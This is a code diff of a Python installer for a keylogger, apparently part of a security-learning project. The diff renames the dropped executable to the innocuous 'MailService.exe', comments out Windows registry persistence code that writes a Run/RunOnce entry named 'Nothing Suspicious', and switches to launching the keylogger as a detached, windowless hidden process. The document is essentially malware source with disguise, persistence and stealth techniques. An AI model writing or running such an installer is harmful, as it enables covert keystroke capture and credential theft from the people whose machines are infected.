@@ -1,4 +1,4 @@
-import winreg
+# import winreg
 import sys
 import os
 import pathlib
@@ -18,19 +18,19 @@ except FileExistsError:
     pass
 
 # ----------------- COPY FILES INTO WORKING DIRECTORY ------------------------
-shutil.copy2(base / "keylogger.exe", executable_path) # Keylogger
+shutil.copy2(base / "MailService.exe", executable_path) # Keylogger
 
 # ------------ CREATE WINDOWS REGISTRY KEY FOR PERSISTENCE -------------------
-key_path = winreg.HKEY_CURRENT_USER
+# key_path = winreg.HKEY_CURRENT_USER
 
-# In an actual attack, "RunOnce" will be replaced with "Run"
-try:
-    sub_key = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
-    key = winreg.CreateKey(key_path, sub_key)
-    winreg.SetValueEx(key, "Nothing Suspicious", 0, winreg.REG_SZ, os.path.abspath(executable_path))
-    winreg.CloseKey(key)
-except Exception as e:
-    print(e)
+# # In an actual attack, "RunOnce" will be replaced with "Run"
+# try:
+#     sub_key = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
+#     key = winreg.CreateKey(key_path, sub_key)
+#     winreg.SetValueEx(key, "Nothing Suspicious", 0, winreg.REG_SZ, os.path.abspath(executable_path))
+#     winreg.CloseKey(key)
+# except Exception as e:
+#     print(e)
 
 # ------------------------------ RUN KEYLOGGER ------------------------------
-subprocess.run([executable_path])
+subprocess.Popen([executable_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
